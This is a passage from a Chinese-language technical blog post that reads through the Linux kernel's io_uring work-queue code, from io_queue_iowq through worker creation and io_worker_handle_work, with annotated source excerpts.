class="line">io_queue_linked_timeout(linked_timeout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要到, 当为 <code>IO_APOLL_ABORTED</code> 时,  调用了 <code>io_queue_iowq</code></p><p>这里先介绍一下 kernel <a href="https://docs.kernel.org/core-api/workqueue.html">work queue</a> 机制,  workqueue 是一个内核线程池, 当有任务来时, 就从线程池中寻找一个线程运行, 这里就是将请求放入线程池的队列中</p><p>这里可能会有读者有疑问, 那线程池是什么时候创建的呢? 其实是在被笔者跳过的 <code>ctx</code> 的创建过程中// #TODO  由于过于繁杂, 笔者暂时没有分析</p><h3 id="io-queue-iowq-任务处理线程池"><code>io_queue_iowq</code> | 任务处理线程池</h3><p>这一部分也比较重要, 首先是 <code>io_prep_async_link(req)</code>  , 为在一条链上的请求创建 work 结构, 用来放入队列中, 并且 通过  <code>io_wq_enqueue</code> 将其加入线程池队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_queue_iowq</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="keyword">struct</span> io_tw_state *ts_dont_use)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">link</span> =</span> io_prep_linked_timeout(req);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span> =</span> req-&gt;task-&gt;io_uring;</span><br><span class="line"></span><br><span class="line">BUG_ON(!tctx);</span><br><span class="line">BUG_ON(!tctx-&gt;io_wq);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init -&gt;work of the whole link before punting */</span></span><br><span class="line">io_prep_async_link(req);</span><br><span class="line"><span class="comment">// 为链少的每一个 req 准备work结构</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Not expected to happen, but if we do have a bug where this _can_</span></span><br><span class="line"><span class="comment"> * happen, catch it here and ensure the request is marked as</span></span><br><span class="line"><span class="comment"> * canceled. That will make io-wq go through the usual work cancel</span></span><br><span class="line"><span class="comment"> * procedure rather than attempt to run this request (or create a new</span></span><br><span class="line"><span class="comment"> * worker for it).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!same_thread_group(req-&gt;task, current)))</span><br><span class="line">req-&gt;work.flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line"></span><br><span class="line">trace_io_uring_queue_async_work(req, io_wq_is_hashed(&amp;req-&gt;work));</span><br><span class="line">io_wq_enqueue(tctx-&gt;io_wq, &amp;req-&gt;work);</span><br><span class="line"><span class="keyword">if</span> (link)</span><br><span class="line">io_queue_linked_timeout(link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么要用work结构而不是 <code>io_kiocb</code> 结构呢, work结构是 <code>io_kiocb</code> 的一个成员, 通过指针减去偏移就可以得到 <code>io_kiocb</code> 的指针, 与此通过, 由于work结构更小, 创建临时结构体时占用空间更小</p><h4 id="io-wq-enqueue"><code>io_wq_enqueue</code></h4><p><code>io_wq_enqueue</code>  是将任务加入 <code>io_wq</code> 线程池的任务队列中.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_wq_enqueue</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="keyword">struct</span> io_wq_work *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> io_work_get_acct(wq, work);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_cb_cancel_data</span> <span class="title">match</span>;</span></span><br><span class="line"><span class="type">unsigned</span> work_flags = work-&gt;flags;</span><br><span class="line"><span class="type">bool</span> do_create;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If io-wq is exiting for this task, or if the request has explicitly</span></span><br><span class="line"><span class="comment"> * been marked as one that should not get executed, cancel it here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) ||</span><br><span class="line">    (work-&gt;flags &amp; IO_WQ_WORK_CANCEL)) &#123;</span><br><span class="line">io_run_cancel(work, wq);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果需要取消 work  </span></span><br><span class="line">raw_spin_lock(&amp;acct-&gt;lock);</span><br><span class="line">io_wq_insert_work(wq, work);</span><br><span class="line">clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags);</span><br><span class="line">raw_spin_unlock(&amp;acct-&gt;lock);</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line">do_create = !io_wq_activate_free_worker(wq, acct);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="comment">// 是否需要创建worker</span></span><br><span class="line"><span class="keyword">if</span> (do_create &amp;&amp; ((work_flags &amp; IO_WQ_WORK_CONCURRENT) ||</span><br><span class="line">    !<span class="type">atomic_read</span>(&amp;acct-&gt;nr_running))) &#123;</span><br><span class="line"><span class="type">bool</span> did_create;</span><br><span class="line"></span><br><span class="line">did_create = io_wq_create_worker(wq, acct);</span><br><span class="line"><span class="comment">// 创建worker</span></span><br><span class="line"><span class="keyword">if</span> (likely(did_create))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 如果已经创建了, 直接返回</span></span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (acct-&gt;nr_workers) &#123;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fatal condition, failed to create the first worker */</span></span><br><span class="line">match.fn= io_wq_work_match_item,</span><br><span class="line">match.data= work,</span><br><span class="line">match.cancel_all= <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">io_acct_cancel_pending_work(wq, acct, &amp;match);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上调用了 <code>io_wq_create_worker</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">io_wq_create_worker</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="keyword">struct</span> io_wq_acct *acct)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!acct-&gt;max_workers))</span><br><span class="line">pr_warn_once(<span class="string">&quot;io-wq is not configured for unbound workers&quot;</span>);</span><br><span class="line"></span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (acct-&gt;nr_workers &gt;= acct-&gt;max_workers) &#123;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果已经有上限个 worker了</span></span><br><span class="line"><span class="comment">// 直接返回</span></span><br><span class="line"></span><br><span class="line">acct-&gt;nr_workers++;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="type">atomic_inc</span>(&amp;acct-&gt;nr_running);</span><br><span class="line"><span class="type">atomic_inc</span>(&amp;wq-&gt;worker_refs);</span><br><span class="line"><span class="keyword">return</span> create_io_worker(wq, acct-&gt;index);</span><br><span class="line"><span class="comment">// 创建一个新worker</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="create-io-worker-worker处理线程的创建"><code>create_io_worker</code>  |  worker处理线程的创建</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">create_io_worker</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> &amp;wq-&gt;acct[index];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_worker</span> *<span class="title">worker</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"></span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"></span><br><span class="line">worker = kzalloc(<span class="keyword">sizeof</span>(*worker), GFP_KERNEL);</span><br><span class="line"><span class="comment">// 为work分配了空间</span></span><br><span class="line"><span class="keyword">if</span> (!worker) &#123;</span><br><span class="line">fail:</span><br><span class="line"><span class="type">atomic_dec</span>(&amp;acct-&gt;nr_running);</span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line">acct-&gt;nr_workers--;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">io_worker_ref_put(wq);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">refcount_set(&amp;worker-&gt;ref, <span class="number">1</span>);</span><br><span class="line">worker-&gt;wq = wq;</span><br><span class="line">raw_spin_lock_init(&amp;worker-&gt;lock);</span><br><span class="line">init_completion(&amp;worker-&gt;ref_done);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index == IO_WQ_ACCT_BOUND)</span><br><span class="line">worker-&gt;flags |= IO_WORKER_F_BOUND;</span><br><span class="line"></span><br><span class="line">tsk = create_io_thread(io_wq_worker, worker, NUMA_NO_NODE);</span><br><span class="line"><span class="comment">// 创建处理线程</span></span><br><span class="line"><span class="keyword">if</span> (!IS_ERR(tsk)) &#123;</span><br><span class="line">io_init_new_worker(wq, worker, tsk);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!io_should_retry_thread(PTR_ERR(tsk))) &#123;</span><br><span class="line">kfree(worker);</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">INIT_WORK(&amp;worker-&gt;work, io_workqueue_create);</span><br><span class="line">schedule_work(&amp;worker-&gt;work);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="io-wq-worker-内核任务线程"><code>io_wq_worker</code>  | 内核任务线程</h4><p>此线程就是线程池中worker的基本单元, 也是真正的异步io处理线程, 其通过自旋锁来阻塞进程, 直到有 work 需要完成.</p><p>中间一大段是和线程调度相关的代码, 包括设置信号处理之类的代码, 由于并不是当前分析的重点, 这里笔者就先跳过了.</p><p>最终, 是调用了 <code>io_worker_handle_work</code>  来处理任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_wq_worker</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_worker</span> *<span class="title">worker</span> =</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> io_wq_get_acct(worker);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq</span> *<span class="title">wq</span> =</span> worker-&gt;wq;</span><br><span class="line"><span class="type">bool</span> exit_mask = <span class="literal">false</span>, last_timeout = <span class="literal">false</span>;</span><br><span class="line"><span class="type">char</span> buf[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">worker-&gt;flags |= (IO_WORKER_F_UP | IO_WORKER_F_RUNNING);</span><br><span class="line"></span><br><span class="line"><span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;iou-wrk-%d&quot;</span>, wq-&gt;task-&gt;pid);</span><br><span class="line">set_task_comm(current, buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state)) &#123;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (io_acct_run_queue(acct))</span><br><span class="line">io_worker_handle_work(acct, worker);</span><br><span class="line"><span class="comment">// 轮询  </span></span><br><span class="line"><span class="comment">// 如果存在需要完成的work </span></span><br><span class="line"><span class="comment">// io_acct_run_queue 就能持有 acct-&gt;lock 返回</span></span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Last sleep timed out. Exit if we&#x27;re not the last worker,</span></span><br><span class="line"><span class="comment"> * or if someone modified our affinity.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (last_timeout &amp;&amp; (exit_mask || acct-&gt;nr_workers &gt; <span class="number">1</span>)) &#123;</span><br><span class="line">acct-&gt;nr_workers--;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">last_timeout = <span class="literal">false</span>;</span><br><span class="line">__io_worker_idle(wq, worker);</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (io_run_task_work())</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">ret = schedule_timeout(WORKER_IDLE_TIMEOUT);</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ksignal</span> <span class="title">ksig</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!get_signal(&amp;ksig))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">last_timeout = <span class="literal">true</span>;</span><br><span class="line">exit_mask = !cpumask_test_cpu(raw_smp_processor_id(),</span><br><span class="line">wq-&gt;cpu_mask);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) &amp;&amp; io_acct_run_queue(acct))</span><br><span class="line">io_worker_handle_work(acct, worker);</span><br><span class="line"><span class="comment">// worker handle 必须持有 acct-&gt;lock </span></span><br><span class="line"></span><br><span class="line">io_worker_exit(worker);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-worker-handle-work"><code>io_worker_handle_work</code></h4><p>这个函数必须持有 <code>acct-&gt;lock</code> 才能进入, 也是此函数真正开始处理任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_worker_handle_work</span><span class="params">(<span class="keyword">struct</span> io_wq_acct *acct,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> io_worker *worker)</span></span><br><span class="line">__<span class="title function_">releases</span><span class="params">(&amp;acct-&gt;lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq</span> *<span class="title">wq</span> =</span> worker-&gt;wq;</span><br><span class="line"><span class="type">bool</span> do_kill = test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work</span> *<span class="title">work</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we got some work, mark us as busy. If we didn&#x27;t, but</span></span><br><span class="line"><span class="comment"> * the list isn&#x27;t empty, it means we stalled on hashed work.</span></span><br><span class="line"><span class="comment"> * Mark us stalled so we don&#x27;t keep looking for work when we</span></span><br><span class="line"><span class="comment"> * can&#x27;t make progress, any work completion or insertion will</span></span><br><span class="line"><span class="comment"> * clear the stalled flag.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">work = io_get_next_work(acct, worker);</span><br><span class="line">raw_spin_unlock(&amp;acct-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (work) &#123;</span><br><span class="line">__io_worker_busy(wq, worker);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Make sure cancelation can find this, even before</span></span><br><span class="line"><span class="comment"> * it becomes the active work. That avoids a window</span></span><br><span class="line"><span class="comment"> * where the work has been removed from our general</span></span><br><span class="line"><span class="comment"> * work list, but isn&#x27;t yet discoverable as the</span></span><br><span class="line"><span class="comment"> * current work item for this worker.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">raw_spin_lock(&amp;worker-&gt;lock);</span><br><span class="line">worker-&gt;next_work = work;</span><br><span class="line">raw_spin_unlock(&amp;worker-&gt;lock);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">io_assign_current_work(worker, work);</span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理所有链起来的任务</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work</span> *<span class="title">next_hashed</span>, *<span class="title">linked</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hash = io_get_work_hash(work);</span><br><span class="line"></span><br><span class="line">next_hashed = wq_next_work(work);</span><br><span class="line"><span class="comment">// 获取下一个任务</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(do_kill) &amp;&amp; (work-&gt;flags &amp; IO_WQ_WORK_UNBOUND))</span><br><span class="line">work-&gt;flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line">wq-&gt;do_work(work);</span><br><span class="line"><span class="comment">// do_work 来处理任务</span></span><br><span class="line">io_assign_current_work(worker, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">linked = wq-&gt;free_work(work);</span><br><span class="line"><span class="comment">// 断链</span></span><br><span class="line">work = next_hashed;</span><br><span class="line"><span class="comment">// 将work改为下一个任务</span></span><br><span class="line"><span class="keyword">if</span> (!work &amp;&amp; linked &amp;&amp; !io_wq_is_hashed(linked)) &#123;</span><br><span class="line">work = linked;</span><br><span class="line">linked = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">io_assign_current_work(worker, work);</span><br><span class="line"><span class="keyword">if</span> (linked)</span><br><span class="line">io_wq_enqueue(wq, linked);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hash != <span class="number">-1U</span> &amp;&amp; !next_hashed) &#123;</span><br><span class="line"><span class="comment">/* serialize hash clear with wake_up() */</span></span><br><span class="line">spin_lock_irq(&amp;wq-&gt;hash-&gt;wait.lock);</span><br><span class="line">clear_bit(hash, &amp;wq-&gt;hash-&gt;<span class="built_in">map</span>);</span><br><span class="line">clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags);</span><br><span class="line">spin_unlock_irq(&amp;wq-&gt;hash-&gt;wait.lock);</span><br><span class="line"><span class="keyword">if</span> (wq_has_sleeper(&amp;wq-&gt;hash-&gt;wait))</span><br><span class="line">wake_up(&amp;wq-&gt;hash-&gt;wait);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (work);</span><br><span class="line"><span class="comment">// 不断循环执行, 直到链上清空</span></span><br><span class="line"><span class="keyword">if</span> (!__io_acct_run_queue(acct))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">raw_spin_lock(&amp;acct-&gt;lock);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这里调用了  <code>do_work</code>  来处理任务, <code>do_work</code> 实际指向的是 <code>io_wq_submit_work</code>, 最终还是调用了 <code>io_issue_queue</code>  来处理任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_wq_submit_work</span><span class="params">(<span class="keyword">struct</span> io_wq_work *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">req</span> =</span> container_of(work, <span class="keyword">struct</span> io_kiocb, work);</span><br><span class="line"><span class="comment">// 通过 work 结构体 直接根据偏移计算拿到 req 的指针</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> *<span class="title">def</span> =</span> &amp;io_issue_defs[req-&gt;opcode];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> issue_flags = IO_URING_F_UNLOCKED | IO_URING_F_IOWQ;</span><br><span class="line"><span class="type">bool</span> needs_poll = <span class="literal">false</span>;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>, err = -ECANCELED;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* one will be dropped by -&gt;io_wq_free_work() after returning to io-wq */</span></span><br><span 